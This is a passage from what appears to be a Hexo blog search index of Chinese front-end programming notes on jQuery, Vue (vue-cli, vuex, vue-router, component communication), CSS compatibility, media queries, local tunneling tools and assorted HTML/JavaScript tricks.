    <url>%2Fblog%2Fjquery%2F%E9%94%9A%E9%93%BE%E6%8E%A5%E5%B9%B3%E6%BB%91%E6%BB%9A%E5%8A%A8.html</url>
    <content type="text"><![CDATA[12345678910111213141516$(function()&#123; $('a[href*=#],area[href*=#]').click(function() &#123; if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') &amp;&amp; location.hostname == this.hostname) &#123; var $target = $(this.hash); $target = $target.length &amp;&amp; $target || $('[name=' + this.hash.slice(1) + ']'); if ($target.length) &#123; var targetOffset = $target.offset().top; $('html,body').animate(&#123; scrollTop: targetOffset &#125;, 1000); return false; &#125; &#125; &#125;);&#125;)]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网穿透]]></title>
    <url>%2Fblog%2Ftools%2F%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</url>
    <content type="text"><![CDATA[为什么要内网穿透 分享网页作为一个 Web 开发者，我们有时候会需要临时地将一个本地的 Web 网站部署到外网，以供它人体验评价或协助调试等等，通常我们会这么做：找到一台运行于外网的 Web 服务器 服务器上有网站所需要的环境，否则自行搭建 将网站部署到服务器上 调试结束后，再将网站从服务器上删除只不过是想向朋友展示一下网站而已，要不要这么麻烦，累感不爱╰（｀□′）╯ 微信调试在微信开发的时候，需要填写与微信服务器相连接的 URL，这个 URL 必须是外网域名，也就是说我们需要在这个外网域名对应的 IP 服务器上做开发，而没办法本地开发调试 Localtunnel 安装 Node 安装 Localtunnel 1npm install -g localtunnel 申请 Tunnel 12lt --port 8000lt --port 8000 --subdomain xxx Ngrok 下载客户端1http://pan.baidu.com/s/1bnwROLL 创建配置文件ngrok.cfg 12server_addr: "tunnel.phpor.me:4443"trust_host_root_certs: false 运行 1./ngrok -config ngrok.cfg -subdomain xxx 8080]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cli脚手架]]></title>
    <url>%2Fblog%2Fvue%2Fvue-cli%E8%84%9A%E6%89%8B%E6%9E%B6.html</url>
    <content type="text"><![CDATA[vue-cli单页面脚手架123456789101、cd到总文件夹2、cnpm install -g vue-cli3、vue init webpack *** （webpack表示一种模式，***表示所需的项目名称） 如果安装vue1.0 webpack#1.04、回车...（前三个yes，后三个no）5、cd 到项目目录6、cnpm install7、cnpm run dev8、执行cnpm run build （启动编译，生成编译后的dist文件） 基于vue-cli改写的多页面模板脚手架 https://github.com/jarvan4dev/vue-multi-pagehttp://codecloud.net/17221.htmlhttps://github.com/cpm828/vue-multi-cli]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-validator表单验证]]></title>
    <url>%2Fblog%2Fvue%2Fvue-validator%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81.html</url>
    <content type="text"><![CDATA[简单用法 1、安装vue-validator 2、main.js中引入vue-validator12import Validator from 'vue-validator'Vue.use(Validator) 3、表单中使用常用的验证包括 required 必填 min 、max 最小最大值 minlength 、maxlength 最小最大长度 pattern 正则表达式12345678910111213validator(name="validator") // name名称任意，但唯一，同一页面可使用多个validator input(v-model="userName" v-validate:user-name="&#123; required : true &#125;") p.error(v-if="$validator.userName.required") 请输入用户名 input(v-model="userPwd" v-validate:user-pwd="&#123; required : true &#125;") p.error(v-if="$validator.userPwd.required") 请输入用户密码 input(v-model="userSpend" v-validate:user-spend="&#123; required : true, min : 100, max : 10000 &#125;") p.error(v-if="$validator.userSpend.required || $validator.userSpend.min || $validator.userSpend.max") 请输入用户每月话费，100~10000 input(v-model="userNickname" v-validate:user-nickname="&#123; required : true, minlength : 1, maxlength : 10 &#125;") p.error(v-if="$validatoruserNickname.required || $validatoruserNickname.minlength || $validatoruserNickname.maxlength") 请输入用户昵称，长度1~10 1234567891011121314151617data () &#123; btnNotActive:&#125;,computed: &#123; btnNotActive () &#123; this.$validator.userName || this.$validator.userPwd || this.$validator.userSpend || this.$validator.userNickname&#125;,methods: &#123; btnClick () &#123; if (!btnNotActive) &#123; // 已激活状态才可点击 console.log('按钮点击') &#125; &#125;&#125;]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-router懒加载]]></title>
    <url>%2Fblog%2Fvue%2Fvue-router%E8%B5%96%E5%8A%A0%E8%BD%BD%E5%86%99%E6%B3%95.html</url>
    <content type="text"><![CDATA[默认的加载模式：12345678910111213141516import Vue from 'vue'import Router from 'vue-router'import HelloWorld from '@/components/HelloWorld'Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component: HelloWorld &#125; ]&#125;) 但当项目过大时需要使用懒加载方法 用法1：12345678910111213141516import Vue from 'vue'import Router from 'vue-router'const HelloWorld = resolve =&gt; require(['@/components/HelloWorld'], resolve)Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component: HelloWorld &#125; ]&#125;) 用法2：12345678910111213141516import Vue from 'vue'import Router from 'vue-router'const HelloWorld = resolve =&gt; import('@/components/HelloWorld').then((module) =&gt; resolve(module))Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component: HelloWorld &#125; ]&#125;) 用法3：12345678910111213141516import Vue from 'vue'import Router from 'vue-router'const HelloWorld = resolve =&gt; require.ensure([], () =&gt; resolve(require('@/components/HelloWorld')), 'HelloWorld')Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component: HelloWorld &#125; ]&#125;)]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-resource前后端请求]]></title>
    <url>%2Fblog%2Fvue%2Fvue-resource%E5%89%8D%E5%90%8E%E7%AB%AF%E8%AF%B7%E6%B1%82.html</url>
    <content type="text"><![CDATA[vue 有自己的请求机制，即vue-resource https://github.com/pagekit/vue-resource 123456789&lt;script src=&quot;https://cdn.jsdelivr.net/vue.resource/1.0.3/vue-resource.min.js&quot;&gt;&lt;/script&gt;&#123; // GET or POST this.$http.get(&apos;url&apos;).then((response) =&gt; &#123; // success callback &#125;, (response) =&gt; &#123; // error callback &#125;)&#125;]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vuex组件间通信]]></title>
    <url>%2Fblog%2Fvue%2Fvuex%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1.html</url>
    <content type="text"><![CDATA[http://vuex.vuejs.org/zh-cn/intro.htmlhttp://www.tuicool.com/articles/vQBbiiQ 应用原理：A组件 通过 actions 中的事件处理 dispatch 一个 mutations 事件(驼峰式命名) =&gt;mutations 来接收上面的事件，并触发 state 状态改变(大写下划线命名) =&gt;state 响应上面的改变，并存储下来，state专门用来存储交互的date数据 =&gt;B组件 通过 getters 来接收 上面 state 的状态 注：使用vuex时页面不能刷新，否则会丢失vuex数据 数据流为了更好地理解 Vuex app 中的数据流，我们来开发一个简单的计数器 app。注意：这个例子仅仅是为了更好地解释概念，在实际情况中并不需要在这种简单的场合使用 Vuex. Store1234567891011121314151617181920212223242526// store.jsimport Vue from 'vue'import Vuex from 'vuex'Vue.use(Vuex)// 应用初始状态const state = &#123; count: 0&#125;// 定义所需的 mutationsconst mutations = &#123; INCREMENT (state) &#123; state.count++ &#125;, DECREMENT (state) &#123; state.count-- &#125;&#125;// 创建 store 实例export default new Vuex.Store(&#123; state, mutations&#125;) Actions123// actions.jsexport const increment = (&#123; dispatch &#125;) =&gt; dispatch('INCREMENT')export const decrement = (&#123; dispatch &#125;) =&gt; dispatch('DECREMENT') Vue 组件里使用模板12345&lt;div&gt; Clicked: &#123;&#123; count &#125;&#125; times &lt;button v-on:click="increment"&gt;+&lt;/button&gt; &lt;button v-on:click="decrement"&gt;-&lt;/button&gt;&lt;/div&gt; 代码12345678910111213141516// 仅需要在根组件中注入 store 实例一次即可import store from './store'import &#123; increment, decrement &#125; from './actions'const app = new Vue(&#123; el: '#app', store, vuex: &#123; getters: &#123; count: state =&gt; state.count &#125;, actions: &#123; increment, decrement &#125; &#125;&#125;) 你会注意到组件本身非常简单：它所做的仅仅是绑定到 state、然后在用户输入时调用 actions。 你也会发现整个应用的数据流是单向的，正如 Flux 最初所定义的那样： 用户在组件中的输入操作触发 action 调用；Actions 通过分发 mutations 来修改 store 实例的状态；Store 实例的状态变化反过来又通过 getters 被组件获知。]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue安装jquery]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E5%AE%89%E8%A3%85jquery.html</url>
    <content type="text"><![CDATA[vue组件中使用jquery 引入CDN1-2或1-3-4-5 1、index.html中引入CDN 2、如果使用window. 在组件中可以直接使用window.$或window.jQuery就可以了 3、如果不想使用window. 可以在build的配置文件中增加全局变量别名123externals: &#123; jquery: 'jQuery'&#125; 4然后在组件中增加（externals中的和import中的和使用的需统一）1import jQuery from 'jquery' 5、然后就可以使用jQuery了1jQuery('.class')..... 不引入CDN不引入CDN就不能使用window.jQuery，也无需到externals中设置别名1、安装jquery1cnpm i -D jquery 2、组件内import1import jQuery from 'jquery' 3、使用1jQuery('.class').....]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue组件传递数据]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE.html</url>
    <content type="text"><![CDATA[父组件修改子组件 vue官方介绍：http://cn.vuejs.org/v2/guide/components.html#单向数据流 传递单个变量例1： 父组件：123456789101112// html:btn(@click="isShowDesigner = true")// 引用子组件designer(:msg.sync='isShowDesigner' v-show="isShowDesigner")// script:data()&#123; return &#123; isShowDesigner: false &#125;&#125;,components: &#123;Designer&#125; 子组件designer：1234567891011// html:btn(@click="dismiss()")// script:props: ['msg'],methods: &#123; dismiss()&#123; this.msg = false &#125;&#125; 例1解析：例1父子组件之间传递的是一个变量，父级派发一个msg事件，用来传递isShowDesigner变量，子组件通过props来接收父级派发的事件msg。此时在父组件中使用isShowDesigner变量，子组件中使用msg代替isShowDesigner变量 传递一个object对象例2： 父组件：12345678910111213// html:btn(@click="designerMessage.isShowDesigner = true")// 引用子组件designer(:designer-msg.sync='designerMessage' v-show="designerMessage.isShowDesigner")// script:data()&#123; designerMessage: &#123; isShowDesigner: false, designerInfo: '' &#125;&#125;,components: &#123;Designer&#125; 子组件designer：1234567891011121314151617// html:input(v-model="inputText")btn(@click="dismiss()")// script:props: ['designerMsg'],data() &#123; return &#123; inputText: '' &#125;&#125;,methods: &#123; dismiss()&#123; this.designerMsg.isShowDesigner = false this.designerMsg.designerInfo = this.inputText &#125;&#125; 例2解析：例2中父级派发designer-msg（不能使用驼峰时，连接符），子级通过designerMsg（使用驼峰时）接收，传递的是一个对象，传递对象时可不使用.sync，默认就是双向绑定；当子组件有多个父级时，props后面可以写多个 指定验证规则的传递如果传入的数据不符合要求，Vue会发出警告父组件：1234567891011// htmldesigner(:prop-a="propDataA", :prop-b="propDataB", :prop-c="propDataC")// scriptdata () &#123; return &#123; propDataA: '', propDataB: '', propDataC: '' &#125;&#125; 子组件designer:1234567891011121314151617181920212223242526272829303132// html// scriptprops: &#123; // 基础类型检测(null允许任何类型) propA: Number, // 可能是多种类型 propB: [String, Number], // 必传且是字符串 propC: &#123; type: String, required: true &#125;, // 数字且有默认值 poopD: &#123; type: Number, default: 100 &#125;, // 数组/对象的默认值应当由一个工厂函数返回 propE: &#123; type: Object, default: function () &#123; return &#123; message: 'Hello' &#125; &#125; &#125;, // 自定义验证函数 propF: &#123; valiator: function (value) &#123; return value &gt; 10 &#125; &#125;&#125; type可以是下面原生构造器： String Number Boolean Function Object Array Symbol type也可以是一个自定义的构造器函数，使用instanceof检测 子组件修改父组件 vue官方介绍：http://cn.vuejs.org/v2/guide/components.html#使用-v-on-绑定自定义事件other：http://www.cnblogs.com/wisewrong/p/6266038.html 只触发事件，不传递数据子组件designer:1234567btn(@click=&quot;ShowSibling&quot;)methods：&#123; ShowSibling () &#123; this.$emit(&apos;showBrother&apos;) // 派发一个事件，显示兄弟组件 &#125;&#125; 父组件：1234567891011designer(@showBrowther=&quot;showOtherChildren&quot;)data () &#123; return &#123; &#125;&#125;,methods: &#123; showOtherChildren (msg) &#123; this.otherChildren.isShow = true // 控制显示其他的子组件 &#125;&#125; 触发事件同时传递数据子组件designer:123456789101112btn(@click=&quot;ShowSibling&quot;)data () &#123; return &#123; propHandle: &apos;&apos; &#125;&#125;,methods：&#123; ShowSibling () &#123; this.$emit(&apos;showBrother&apos;, propHandle) // 派发一个事件，去显示兄弟组件，同时传递transmitData数据 &#125;&#125; 父组件：123456789101112131415designer(@showBrowther=&quot;showOtherChildren&quot;)data () &#123; return &#123; getData: &apos;&apos; &#125;&#125;,methods: &#123; // 此例在html中写成@showBrowther=&quot;showOtherChildren&quot; // 也可在事件中心写this.$on(&apos;showOtherChildren&apos;, &#123;&#125;) showOtherChildren (msg) &#123; this.otherChildren.isShow = true // 控制显示其他的子组件 this.getData = msg // 控制显示其他的子组件 &#125;&#125; 兄弟组件之间修改 vue官方介绍：http://cn.vuejs.org/v2/guide/components.html#非父子组件通信vue1.0升2.0：https://cn.vuejs.org/v2/guide/migration.html#dispatch-和-broadcast-替换other：http://www.javascriptcn.com/read-1774.html 有时候两个非父子组件之间也需要通信，如兄弟组件或祖父子组件，我们可以考虑使用一个空的Vue实例作为中央事件总线： 公共js:1234import Vue from 'vue'let eventHub = new Vue()export default eventHub 子组件A:12345678910// NewTodoInputimport eventHub from '../utilities/centerHub'methods: &#123; addTodo: function () &#123; eventHub.$emit('add-todo', &#123; text: this.newTodoText &#125;) this.newTodoText = '' &#125;&#125; 子组件B:123456789// DeleteTodoButtonimport eventHub from '../utilities/centerHub'methods: &#123; deleteTodo: function (id) &#123; eventHub.$emit('delete-todo', id) &#125;&#125; 父组件：12345678910111213141516171819202122// Todoscreated: function () &#123; eventHub.$on('add-todo', this.addTodo) eventHub.$on('delete-todo', this.deleteTodo)&#125;,// 最好在组件销毁前// 清除事件监听beforeDestroy: function () &#123; eventHub.$off('add-todo', this.addTodo) eventHub.$off('delete-todo', this.deleteTodo)&#125;,methods: &#123; addTodo: function (newTodo) &#123; this.todos.push(newTodo) &#125;, deleteTodo: function (todoId) &#123; this.todos = this.todos.filter(function (todo) &#123; return todo.id !== todoId &#125;) &#125;&#125; 复杂组件通信复杂的组件通信应当考虑使用vuex来通信 vuex官方介绍：http://vuex.vuejs.org/zh-cn/intro.html个人：https://cpm828.github.io/blog/vue/vuex%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1.html 注：$dispatch和$broadcast在vue2.0中已经被移除]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue常用]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E5%B8%B8%E7%94%A8.html</url>
    <content type="text"><![CDATA[动态class:12345// 通过变量控制class:（列表和单个时有不同）:class="&#123; 'redpacket-para-margin' : model.redpackets.logo_url &#125;":class=" model.redpackets.logo_url ? 'redpacket-para-margin' : '' ":class=" !model.redpackets.logo_url || 'redpacket-para-margin' ":class=" model.redpackets.logo_url &amp;&amp; 'redpacket-para-margin' " 动态src:1234567// 对于template里面动态图片:src需要使用默认的图片,需将该本地图片资源从assets移动外一级static中,使用./static/*.png即可// 有则使用，无则使用默认:src="model.redpackets.background_url || '/static/img/auto-bg.png'"// 有则使用，无则隐藏:src="model.redpackets.watermark_url" v-show="model.redpackets.watermark_url" 输入框有则禁止输入1document.querySelector('.phone').readOnly = !!this.model.phone 写法除date、ready是()外，其余均带：12345678910export default &#123; data () &#123; return Object.assign(&#123;&#125;, &#123; &#125;) &#125;, components: &#123;&#125;， ready () &#123;&#125;, computed : &#123;&#125;, methods : &#123;&#125; &#125; 拼接链接12345678linkHref () &#123; // 跳转地址 return [ '/secret_reward?token=' + (this.model.token || ''), 'packet_id=' + (this.model.packet_id || ''), 'receiver_account_id=' + (this.model.receiver_account_id || ''), 'grant=' + (this.grant || '') ].join('&amp;')&#125;]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css常见兼容性的处理办法]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E5%B8%B8%E8%A7%81%E5%85%BC%E5%AE%B9%E6%80%A7%E5%A4%84%E7%90%86.html</url>
    <content type="text"><![CDATA[前端常见的浏览器兼容性问题及解决方法 png24位的图片在iE6浏览器上出现背景解决方案：做成PNG8，也可以引用一段脚本处理。 浏览器默认的margin和padding不同解决方案：加一个全局的*{margin:0;padding:0;}来统一。 IE6双边距bug：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。如：#box{ float:left; width:10px; margin:0 0 0 10px;}解决方案：在float的标签样式控制中加入_display:inline;将其转化为行内属性。( _ 这个符号只有ie6会识别)这种情况之下IE会产生20px的距离 渐进识别的方式，从总体中逐渐排除局部。首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。接着，再次使用 “+” 将IE8和IE7、IE6分离开来，这样IE8已经独立识别。 123456bb &#123; background-color:#f1ee18; /*所有识别*/ background-color:#00deff\9; /*IE6、7、8识别*/ +background-color:#a200ff; /*IE6、7识别*/ _background-color:#1e0bd1; /*IE6识别*/&#125; IE下，可以使用获取常规属性的方法来获取自定义属性，也可以使用 getAttribute 获取自定义属性；Firefox下,只能使用getAttribute获取自定义属性解决方法：统一通过getAttribute获取自定义属性 IE下，event对象有 x、y 属性，但是没有pageX、pageY属性; Firefox下，event对象有pageX、pageY属性，但是没有 x、y 属性解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。 Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示解决方法：可通过加入 CSS 属性-webkit-text-size-adjust: none;解决 超链接访问过后 hover 样式就不出现了，被点击访问过的超链接样式不在具有hover和active了解决方法：改变CSS属性的排列顺序 L-V-H-A 1234a:link &#123;&#125;a:visited &#123;&#125;a:hover &#123;&#125;a:active &#123;&#125; 怪异模式问题：漏写 DTD 声明，Firefox 仍然会按照标准模式来解析网页，但在 IE 中会触发怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写 DTD 声明的好习惯。现在可以使用html5 推荐的写法：&lt;!DOCTYPE html&gt; 上下margin重合问题：ie和ff都存在，相邻的两个div的margin-left和margin-right不会重合，但是margin-top和margin-bottom却会发生重合。解决方法：养成良好的代码编写习惯，同时采用margin-top或者同时采用margin-bottom。 ie6对png图片格式支持不好解决方案：引用一段脚本处理]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Angular validate 表单验证]]></title>
    <url>%2Fblog%2Fangular%2Fangular_validate%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81.html</url>
    <content type="text"><![CDATA[1、CDN 1http://cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js 2、DEMO 1234567891011121314151617181920212223242526272829303132333435&lt;h1&gt;angular validate&lt;/h1&gt;&lt;form name=&quot;myForm&quot; ng-app=&quot;myApp&quot; ng-controller=&quot;myCtrl&quot; novalidate&gt; 用户名：&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;user&quot; ng-model=&quot;user&quot; required ng-minlength=&quot;2&quot; ng-maxlength=&quot;5&quot;/&gt; &lt;span style=&quot;color:red&quot; ng-show=&quot;myForm.user.$dirty &amp;&amp; myForm.user.$invalid&quot;&gt; &lt;span ng-show=&quot;myForm.user.$error.required&quot;&gt;用户名是必须的&lt;/span&gt; &lt;span ng-show=&quot;myForm.user.$error.minlength&quot;&gt;用户名至少两个字符&lt;/span&gt; &lt;span ng-show=&quot;myForm.user.$error.maxlength&quot;&gt;用户名至多五个字符&lt;/span&gt; &lt;/span&gt; &lt;br&gt; 年龄：&lt;br&gt; &lt;input type=&quot;number&quot; name=&quot;age&quot; ng-model=&quot;age&quot; required ng-min=&quot;18&quot; ng-max=&quot;60&quot;/&gt; &lt;span style=&quot;color:red&quot; ng-show=&quot;myForm.age.$dirty &amp;&amp; myForm.age.$invalid&quot;&gt; &lt;span ng-show=&quot;myForm.age.$error.required&quot;&gt;年龄是必须的&lt;/span&gt; &lt;span ng-show=&quot;myForm.age.$error.min&quot;&gt;年龄必须大于18&lt;/span&gt; &lt;span ng-show=&quot;myForm.age.$error.max&quot;&gt;年龄必须小于60&lt;/span&gt; &lt;/span&gt;&lt;br&gt; 邮箱：&lt;br&gt; &lt;input type=&quot;email&quot; name=&quot;email&quot; ng-model=&quot;email&quot; required /&gt; &lt;span style=&quot;color:red&quot; ng-show=&quot;myForm.email.$dirty &amp;&amp; myForm.email.$invalid&quot;&gt; &lt;span ng-show=&quot;myForm.email.$error.required&quot;&gt;邮箱是必须的&lt;/span&gt; &lt;span ng-show=&quot;myForm.email.$error.email&quot;&gt;非法的邮箱格式&lt;/span&gt; &lt;/span&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; ng-disabled=&quot;myForm.user.$pristine || myForm.user.$invalid || myForm.age.$pristine || myForm.age.$invalid || myForm.email.$pristine || myForm.email.$invalid&quot;&gt;&lt;!-- 无填写记录或者内容不合法时，按钮为不可点击状态 --&gt;&lt;!-- 此验证为表单实时验证 --&gt;&lt;/form&gt; form中的novalidate表示禁用浏览器默认的验证 $dirty: 表单有填写记录 $pristine: 表单没有填写记录 $valid: 字段内容是合法的 $invalid: 字段内容是非法的 参考：http://www.runoob.com/try/try.php?filename=try_ng_validate]]></content>
      <tags>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css媒体查询]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637/* iPhone4 */@media only screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) &#123;&#125;/* iPhone5 */@media only screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) &#123; &#125;/* iPhone6、iPhone7、iPhone8 */@media only screen and (device-height:375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) &#123; &#125;/* iPhone6Plus、iPhone7Plus、iPhone8Plus */@media only screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) &#123; &#125;/* iPhoneX */@media only screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) &#123;&#125;/* iPhoneX */@media only screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) &#123; &#125;/* iPhoneXR */@media only screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) &#123;&#125;/* iPhoneXs */@media only screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) &#123;&#125;/* iPhoneXs Max */@media only screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) &#123;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML和JavaScript特别技巧集锦]]></title>
    <url>%2Fblog%2Fjavascript%2Fhtml%E5%92%8Cjs%E7%89%B9%E5%88%AB%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6.html</url>
    <content type="text"><![CDATA[让弹出窗口总是在最上面: 1&lt;body onblur="this.focus();"&gt; 不要滚动条让竖条没有: 1&lt;body style="overflow:scroll;overflow-y:hidden"&gt;&lt;/body&gt; 让横条没有: 1&lt;body style="overflow:scroll;overflow-x:hidden"&gt;&lt;/body&gt; 两个都去掉？更简单了 1&lt;body scroll="no"&gt;&lt;/body&gt; 怎样去掉图片链接点击后，图片周围的虚线？ 1&lt;a href="#" onFocus="this.blur()"&gt;&lt;img src="logo.jpg" border=0&gt;&lt;/a&gt; 电子邮件处理提交表单 123&lt;form name="form1" method="post" action="mailto:**@**.com" enctype="text/plain"&gt; &lt;input type="submit"&gt;&lt;/form&gt; 在打开的子窗口刷新父窗口的代码里如何写？ 1window.opener.location.reload() 如何设定打开页面的大小 12打开页面的大小&lt;body onload="top.resizeTo(300,200);"&gt;打开页面的位置&lt;body onload="top.moveBy(300,200);"&gt; 在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动 12345678&lt;style&gt;body&#123; background-image:url(logo.gif); background-repeat:no-repeat; background-position:center; background-attachment: fixed&#125;&lt;/style&gt; 获得一个窗口的大小 12document.body.clientWidth;document.body.clientHeight 怎么判断是否是字符 12if (/[^/x00-/xff]/g.test(s)) alert("含有汉字");else alert("全是字符"); 日期减去天数等于第二个日期 123456789101112&lt;script language="javascript"&gt;function cc(dd,dadd)&#123; //可以加上错误处理 var a = new Date(dd); a = a.valueOf(); a = a - dadd * 24 * 60 * 60 * 1000; a = new Date(a); alert(a.getFullYear() + "年" + (a.getMonth() + 1) + "月" + a.getDate() + "日");&#125;cc("12/23/2002",2)&lt;/script&gt; 脚本永不出错 12345678&lt;script language="javascript"&gt;&lt;!-- Hidefunction killErrors() &#123;return true;&#125;window.onerror = killErrors;// --&gt;&lt;/script&gt; ENTER键可以让光标移到下一个输入框 1&lt;input onkeydown="if(event.keyCode==13) event.keyCode=9"&gt; 各种样式的光标 auto ：标准光标 default ：标准箭头 hand ：手形光标 wait ：等待光标 text ：I形光标 vertical-text ：水平I形光标 no-drop ：不可拖动光标 not-allowed ：无效光标 help ：?帮助光标 all-scroll ：三角方向标 move ：移动标 crosshair ：十字标 e-resize n-resize nw-resize w-resize s-resize se-resize sw-resize 页面进入和退出的特效进入页面: 12&lt;meta http-equiv="Page-Enter" content="revealTrans(duration=x, transition=y)"&gt; 推出页面: 1&lt;meta http-equiv="Page-Exit" content="revealTrans(duration=x, transition=y)"&gt; 这个是页面被载入和调出时的一些特效。duration表示特效的持续时间，以秒为单位。transition表示使用哪种特效，取值为1-23: 0 矩形缩小1 矩形扩大2 圆形缩小3 圆形扩大4 下到上刷新5 上到下刷新6 左到右刷新7 右到左刷新8 竖百叶窗9 横百叶窗10 错位横百叶窗11 错位竖百叶窗12 点扩散13 左右到中间刷新14 中间到左右刷新15 中间到上下16 上下到中间17 右下到左上18 右上到左下19 左上到右下20 左下到右上21 横条22 竖条23 以上22种随机选择一种 在规定时间内跳转 1&lt;meta http-equiv=V="REFRESH" content="5;url=http://www.51js.com"&gt; 网页是否被检索 1&lt;meta name=&quot;ROBOTS&quot; content=&quot;属性值&quot;&gt; 其中属性值有以下一些:属性值为”all”: 文件将被检索，且页上链接可被查询；属性值为”none”: 文件不被检索，而且不查询页上的链接；属性值为”index”: 文件将被检索；属性值为”follow”: 查询页上的链接；属性值为”noindex”: 文件不检索，但可被查询链接；属性值为”nofollow”: 文件不被检索，但可查询页上的链接。]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iframe嵌入网页高度自适应]]></title>
    <url>%2Fblog%2Fjavascript%2Fiframe%E5%B5%8C%E5%85%A5%E7%BD%91%E9%A1%B5%E9%AB%98%E5%BA%A6%E8%87%AA%E9%80%82%E5%BA%94.html</url>
    <content type="text"><![CDATA[原理：1、使用document.body.scrollHeight获取iframe的高度，作为hash添加给window.top.location2、在主页面获取window.top.location的hash值，再将该值赋给iframe高度 iframe中：12345var hostUrl = window.top.location.toString().split("#")[0]; // 去除hash后的字符串if (hostUrl) &#123; hostUrl += "#height=" + document.body.scrollHeight; // 将高度存放在hash中 window.top.location = hostUrl;&#125; 主页面中：123456789function iframeHeight() &#123; var hash = window.location.hash.slice(1); // 获取第一个hash，即iframe存在地址栏的hash参数 if (hash &amp;&amp; /height=/.test(hash)) &#123; document.getElementById('iframePage').height = hash.replace("height=", ""); &#125; setTimeout(iframeHeight, 200);&#125;iframeHeight();]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[innerText和textContent的异同]]></title>
    <url>%2Fblog%2Fjavascript%2FinnerText%E5%92%8CtextContent%E7%9A%84%E5%BC%82%E5%90%8C.html</url>
    <content type="text"><![CDATA[参考资料：http://www.jb51.net/article/25082.htm innerText: IEtextContent: FF innerText它的内容实际上就是你在浏览器看到的内容。它会将innerHTML中的转义字符（&lt;、 &amp;）进行换码它将元素的innerHTML换码、解释，最终显示出来去除各种格式信息留下的纯文本。它会将多个空格并成一个空格对待，会把换成换行符，而本来的换行符却并不会引起换行 总结：换行必须使用标签，回车无效 多个空格只显示一个空格 textContent它的内容则是innerHTML去除所有标签后的内容它会将innerHTML中的转义字符（&lt;、 &amp;）进行换码不对任何html标签进行解释，而是直接剔除它们。不对innerHTML中的文本按照HTML的方式进行格式转换 比如多个空格不会合并为一个空格，换行符仍然存在，相反却不会导致换行 总结：换行必须回车，无效 多个空格不会合并成一个 操作1、HTML转义（对&gt;、&lt;、&amp;等转义字符进行处理）2、经过HTML解释和CSS解释3、剔除格式信息 innerText: 处理1、2、3 textContent: 只处理1]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的js的各种宽高值]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%90%84%E7%A7%8D%E5%AE%BD%E9%AB%98.html</url>
    <content type="text"><![CDATA[常见的js的各种宽高值 document.document.clientHeight:页面窗口高度document.body.clientHeight:页面内容高度document.body.scrollTop:滚动条的高度，在顶部为0]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
